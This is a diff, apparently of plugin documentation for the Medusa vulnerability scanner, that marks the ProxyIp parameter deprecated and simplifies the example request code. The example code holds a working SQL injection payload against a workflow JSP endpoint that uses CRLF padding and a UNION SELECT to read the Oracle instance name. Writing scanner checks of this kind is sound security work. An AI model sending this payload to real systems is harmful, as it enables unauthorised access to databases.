@@ -45,8 +45,6 @@ def medusa(Url,RandomAgent,ProxyIp):
         port = 80
     else:
         port = port
-    global resp
-    global resp2
     try:
         payload = "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333"
         payload_url = scheme + "://" + url +":"+ str(port)+ payload
@@ -59,20 +57,10 @@ def medusa(Url,RandomAgent,ProxyIp):
         }
 
         s = requests.session()
-        if ProxyIp!=None:
-            proxies = {
-                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-                "http": "http://" + str(ProxyIp)
-            }
-            resp = s.post(payload_url,
-                          data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
-                                                                                 'v$instance order by (((1'},
-                          headers=headers, timeout=6, proxies=proxies,verify=False)
-        elif ProxyIp==None:
-            resp = s.post(payload_url,
-                         data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
-                                                                                'v$instance order by (((1'},
-                         headers=headers, timeout=6, verify=False)
+        resp = s.post(payload_url,
+                      data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
+                            'v$instance order by (((1'},
+                      headers=headers, timeout=6, verify=False)
         con = resp.text
         code = resp.status_code
         if code == 200 and con.lower().find('''"draggable":''') != -1 and con.lower().find(
@@ -167,20 +155,10 @@ def medusa(Url,RandomAgent,ProxyIp):
         }
 
         s = requests.session()
-        if ProxyIp!=None:
-            proxies = {
-                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-                "http": "http://" + str(ProxyIp)
-            }
-            resp = s.post(payload_url,
-                          data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
-                                                                                 'v$instance order by (((1'},
-                          headers=headers, timeout=6, proxies=proxies,verify=False)
-        elif ProxyIp==None:
-            resp = s.post(payload_url,
-                         data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
-                                                                                'v$instance order by (((1'},
-                         headers=headers, timeout=6, verify=False)
+        resp = s.post(payload_url,
+                      data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
+                            'v$instance order by (((1'},
+                      headers=headers, timeout=6, verify=False)
         con = resp.text
         code = resp.status_code
         if code == 200 and con.lower().find('''"draggable":''') != -1 and con.lower().find(
@@ -206,9 +184,9 @@ def medusa(Url,RandomAgent,ProxyIp):
 
 - 扫描器传入的随机或者自定义的User-Agent
 
-###### ProxyIp
+###### ~~ProxyIp~~（已弃用）
 
-- 扫描器出入的代理，默认是关闭的
+- ~~扫描器出入的代理，默认是关闭的~~
 
 ##### 注意点:
 
@@ -256,11 +234,12 @@ def medusa(Url,RandomAgent,ProxyIp):
 
 - 移除类的返回值可以为空因为数据过于庞大，也不宜验证
 
-###### ProxyIp
+###### ~~ProxyIp~~（已弃用）
 
-- 必须存在如下的```if```..```elif```判断语句，并且里面的值```resp```需要在前面声明全局使用(例:```global resp```
+- ~~必须存在如下的```if```..```elif```判断语句，并且里面的值```resp```需要在前面声明全局使用(例:```global resp```~~
 
 ```python
+#以下代码均弃用
 if ProxyIp!=None:
             proxies = {
                 "http": "http://" + str(ProxyIp)
@@ -323,10 +302,7 @@ if ProxyIp!=None:
                   'Accept': '*/*',
                   'User-Agent': RandomAgent,
               }
-              if ProxyIp != None:
-                  ...
-              elif ProxyIp == None:
-                  ...
+  			resp = s.post(...)
               con = resp.text
               code = resp.status_code
               if code == 200:
